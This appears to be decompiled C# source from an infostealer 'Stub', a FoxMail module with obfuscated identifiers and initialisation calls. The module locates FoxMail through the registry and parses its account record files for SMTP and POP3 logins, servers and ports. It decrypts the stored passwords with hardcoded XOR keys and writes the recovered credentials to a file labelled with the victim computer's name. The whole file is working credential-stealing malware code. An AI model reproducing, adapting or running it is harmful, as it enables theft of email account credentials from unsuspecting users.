using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000042 RID: 66
	public static class FoxMail
	{
		// Token: 0x06000135 RID: 309 RVA: 0x0000EAF8 File Offset: 0x0000CCF8
		public static DataExtractionStructs.FoxMailInfo[] GetInfo()
		{
			string foxMailLocation = FoxMail.GetFoxMailLocation();
			DataExtractionStructs.FoxMailInfo[] array;
			if (foxMailLocation == null)
			{
				array = null;
			}
			else
			{
				string text = Path.Combine(foxMailLocation, "Storage");
				if (!Directory.Exists(text))
				{
					array = null;
				}
				else
				{
					List<DataExtractionStructs.FoxMailInfo> list = new List<DataExtractionStructs.FoxMailInfo>();
					foreach (string text2 in Directory.GetDirectories(text, "*@*"))
					{
						string text3 = Path.Combine(text2, "Accounts", "Account.rec0");
						if (File.Exists(text3))
						{
							byte[] array2 = Utils.ForceReadFile(text3, false);
							if (array2 != null)
							{
								bool flag;
								Dictionary<string, string[]> dictionary = FoxMail.parseRecFileStrings(array2, out flag);
								if (dictionary.ContainsKey("Account") && dictionary.ContainsKey("Password"))
								{
									string[] array3 = dictionary["Account"];
									string[] array4 = dictionary["Password"];
									string[] array5 = null;
									if (dictionary.ContainsKey("OutgoingServer"))
									{
										array5 = dictionary["OutgoingServer"];
									}
									else if (dictionary.ContainsKey("SMTPServer"))
									{
										array5 = dictionary["SMTPServer"];
									}
									string[] array6 = null;
									if (dictionary.ContainsKey("OutgoingPort"))
									{
										array6 = dictionary["OutgoingPort"];
									}
									else if (dictionary.ContainsKey("SMTPPort"))
									{
										array6 = dictionary["SMTPPort"];
									}
									if (array3.Length == array4.Length)
									{
										for (int j = 0; j < array3.Length; j++)
										{
											string text4 = array3[j];
											string text5 = FoxMail.DecodePassword(array4[j], flag);
											string text6 = ((array5 == null || j >= array5.Length) ? "unknown" : array5[j]);
											string text7 = ((array6 == null || j >= array6.Length) ? "unknown" : array6[j]);
											bool flag2 = false;
											foreach (DataExtractionStructs.FoxMailInfo foxMailInfo in list)
											{
												if (!foxMailInfo.pop3 && (foxMailInfo.account == text4 && foxMailInfo.password == text5 && foxMailInfo.smtpserver == text6) && foxMailInfo.smtpport == text7)
												{
													flag2 = true;
													break;
												}
											}
											if (!flag2)
											{
												list.Add(new DataExtractionStructs.FoxMailInfo(text4, text5, false, text6, text7));
												Counter.FoxMail = true;
											}
										}
									}
								}
								if (dictionary.ContainsKey("POP3Account") && dictionary.ContainsKey("POP3Password"))
								{
									string[] array7 = dictionary["POP3Account"];
									string[] array8 = dictionary["POP3Password"];
									string[] array9 = null;
									if (dictionary.ContainsKey("IncomingServer"))
									{
										array9 = dictionary["IncomingServer"];
									}
									else if (dictionary.ContainsKey("POP3Server"))
									{
										array9 = dictionary["POP3Server"];
									}
									string[] array10 = null;
									if (dictionary.ContainsKey("IncomingPort"))
									{
										array10 = dictionary["IncomingPort"];
									}
									else if (dictionary.ContainsKey("POP3Port"))
									{
										array10 = dictionary["POP3Port"];
									}
									if (array7.Length == array8.Length)
									{
										for (int k = 0; k < array7.Length; k++)
										{
											string text8 = array7[k];
											string text9 = FoxMail.DecodePassword(array8[k], flag);
											string text10 = ((array9 == null || k >= array9.Length) ? "unknown" : array9[k]);
											string text11 = ((array10 == null || k >= array10.Length) ? "unknown" : array10[k]);
											bool flag3 = false;
											foreach (DataExtractionStructs.FoxMailInfo foxMailInfo2 in list)
											{
												if (foxMailInfo2.pop3 && (foxMailInfo2.account == text8 && foxMailInfo2.password == text9 && foxMailInfo2.smtpserver == text10) && foxMailInfo2.smtpport == text11)
												{
													flag3 = true;
													break;
												}
											}
											if (!flag3)
											{
												list.Add(new DataExtractionStructs.FoxMailInfo(text8, text9, true, text10, text11));
												Counter.FoxMail = true;
											}
										}
									}
								}
							}
						}
					}
					array = list.ToArray();
				}
			}
			return array;
		}

		// Token: 0x06000136 RID: 310 RVA: 0x0000EF6C File Offset: 0x0000D16C
		private static bool isAscii(int x)
		{
			return 32 <= x && x <= 127;
		}

		// Token: 0x06000137 RID: 311 RVA: 0x0000EF8C File Offset: 0x0000D18C
		private static bool IsMatch(byte[] file, int start, byte[] pattern)
		{
			for (int i = 0; i < pattern.Length; i++)
			{
				if (file[start + i] != pattern[i])
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x06000138 RID: 312 RVA: 0x0000EFC0 File Offset: 0x0000D1C0
		private static Dictionary<string, string[]> parseRecFileStrings(byte[] fileBytes, out bool v6)
		{
			int num = 4;
			byte[] bytes = BitConverter.GetBytes(256);
			byte[] bytes2 = BitConverter.GetBytes(8);
			v6 = fileBytes[0] == 208;
			Dictionary<string, List<string>> dictionary = new Dictionary<string, List<string>>();
			for (int num2 = 0; num2 <= fileBytes.Length - num; num2++)
			{
				bool flag = false;
				bool flag2 = false;
				if (FoxMail.IsMatch(fileBytes, num2, bytes))
				{
					flag2 = true;
				}
				else if (FoxMail.IsMatch(fileBytes, num2, bytes2))
				{
					flag = true;
				}
				if (flag || flag2)
				{
					string text = "";
					string text2 = "";
					bool flag3 = false;
					int i = num2 - 1;
					while (i > 0)
					{
						try
						{
							if (!FoxMail.isAscii((int)fileBytes[i]))
							{
								int num3 = BitConverter.ToInt32(fileBytes, i - 3);
								if (num3 != 0 && num3 == text.Length)
								{
									text = Utils.ReverseString(text);
									flag3 = true;
								}
								break;
							}
							string text3 = text;
							char c = (char)fileBytes[i];
							text = text3 + c.ToString();
						}
						catch
						{
							flag3 = false;
							break;
						}
						i--;
						continue;
						IL_0182:
						if (flag3)
						{
							try
							{
								if (flag2)
								{
									int num4 = BitConverter.ToInt32(fileBytes, num2 + 4);
									text2 = Encoding.UTF8.GetString(fileBytes, num2 + 8, num4);
								}
								else if (flag)
								{
									int num5 = BitConverter.ToInt32(fileBytes, num2 + 4) * 2;
									text2 = Encoding.Unicode.GetString(fileBytes, num2 + 8, num5);
								}
							}
							catch
							{
								flag3 = false;
							}
						}
						if (flag3)
						{
							if (!dictionary.ContainsKey(text))
							{
								dictionary[text] = new List<string>();
							}
							dictionary[text].Add(text2);
							goto IL_0177;
						}
						goto IL_0177;
					}
					goto IL_0182;
				}
				IL_0177:;
			}
			return dictionary.ToDictionary((KeyValuePair<string, List<string>> kvp) => kvp.Key, (KeyValuePair<string, List<string>> kvp) => kvp.Value.ToArray());
		}

		// Token: 0x06000139 RID: 313 RVA: 0x0000F1C0 File Offset: 0x0000D3C0
		private static string GetFoxMailLocation()
		{
			string text = "SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command";
			object obj = Utils.ReadRegistryKeyValue(RegistryHive.LocalMachine, text, "");
			if (obj == null || obj.GetType() != typeof(string))
			{
				obj = Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, text, "");
				if (obj == null || obj.GetType() != typeof(string))
				{
					return null;
				}
			}
			string text2 = (string)obj;
			int num = text2.LastIndexOf("\"");
			string text4;
			if (num > 0)
			{
				string text3 = text2.Substring(1, num - 1);
				text4 = Path.GetDirectoryName(text3);
			}
			else
			{
				text4 = null;
			}
			return text4;
		}

		// Token: 0x0600013A RID: 314 RVA: 0x0000F26C File Offset: 0x0000D46C
		private static byte[] ExtendArrayByX(byte[] array, int x)
		{
			byte[] array2 = new byte[array.Length * x];
			for (int i = 0; i < x; i++)
			{
				Array.Copy(array, 0, array2, array.Length * i, array.Length);
			}
			return array2;
		}

		// Token: 0x0600013B RID: 315 RVA: 0x0000F2A8 File Offset: 0x0000D4A8
		private static string DecodePassword(string password_hex, bool v6)
		{
			byte[] array = FoxMail.V7Password;
			byte b = FoxMail.V7FirstByteDifference;
			if (v6)
			{
				array = FoxMail.V6Password;
				b = FoxMail.V6FirstByteDifference;
			}
			byte[] array2 = Utils.ConvertHexStringToByteArray(password_hex);
			string text;
			if (array2 == null)
			{
				text = null;
			}
			else
			{
				int num = (array2.Length + array.Length - 1) / array.Length;
				array = FoxMail.ExtendArrayByX(array, num);
				byte[] array3 = array2;
				int num2 = 0;
				array3[num2] ^= b;
				byte[] array4 = new byte[array2.Length];
				for (int i = 1; i <= array4.Length - 1; i++)
				{
					array4[i - 1] = array2[i] ^ array[i - 1];
				}
				string text2 = "";
				for (int j = 0; j < array4.Length - 1; j++)
				{
					int num3 = (int)(array4[j] - array2[j]);
					if (num3 < 0)
					{
						num3 += 255;
					}
					text2 += ((char)num3).ToString();
				}
				text = text2;
			}
			return text;
		}

		// Token: 0x0600013C RID: 316 RVA: 0x0000F398 File Offset: 0x0000D598
		public static void SaveFoxMailAccountsToFile()
		{
			try
			{
				DataExtractionStructs.FoxMailInfo[] info = FoxMail.GetInfo();
				if (info == null || info.Length == 0)
				{
					Logging.Log("No FoxMail accounts found.", true);
				}
				else
				{
					string text = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss");
					string compname = SystemInfo.Compname;
					string text2 = Paths.InitWorkDir();
					string text3 = Path.Combine(text2, string.Concat(new string[] { "Foxmail_", compname, "_", text, ".txt" }));
					using (StreamWriter streamWriter = new StreamWriter(text3, false, Encoding.UTF8))
					{
						foreach (DataExtractionStructs.FoxMailInfo foxMailInfo in info)
						{
							streamWriter.WriteLine(foxMailInfo.ToString());
							streamWriter.WriteLine(new string('-', 50));
						}
					}
					Logging.Log("FoxMail account details saved to: " + text3, true);
				}
			}
			catch (Exception ex)
			{
				Logging.Log("An error occurred while saving FoxMail accounts: " + ex.Message, true);
			}
		}

		// Token: 0x0600013D RID: 317 RVA: 0x0000F4CC File Offset: 0x0000D6CC
		static FoxMail()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			FoxMail.V6Password = new byte[] { 126, 100, 114, 97, 71, 111, 110, 126 };
			FoxMail.V6FirstByteDifference = 90;
			FoxMail.V7Password = new byte[] { 126, 70, 64, 55, 37, 109, 36, 126 };
			FoxMail.V7FirstByteDifference = 113;
		}

		// Token: 0x04000154 RID: 340
		private static byte[] V6Password;

		// Token: 0x04000155 RID: 341
		private static byte V6FirstByteDifference;

		// Token: 0x04000156 RID: 342
		private static byte[] V7Password;

		// Token: 0x04000157 RID: 343
		private static byte V7FirstByteDifference;
	}
}
